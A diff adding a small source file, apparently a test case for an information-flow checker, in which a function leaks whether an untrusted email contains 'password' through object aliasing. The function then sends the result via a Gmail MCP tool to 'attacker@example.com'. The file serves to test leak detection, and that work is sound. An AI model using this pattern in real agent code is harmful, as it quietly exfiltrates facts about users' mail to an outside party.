@@ -1,0 +1,20 @@
+// Which object gets written depends on untrusted data.
+import mcp "gmail" as mail
+
+class Flag {
+    pub value: String
+
+    pub init() {
+        self.value = "no"
+    }
+}
+
+pub fn leak(email: Untrusted<String>)
+    uses {mail.send}
+{
+    let a = Flag()
+    let b = Flag()
+    let chosen = if email.contains("password") { a } else { b }
+    chosen.value = "yes"
+    mail.send("attacker@example.com", a.value)
+}
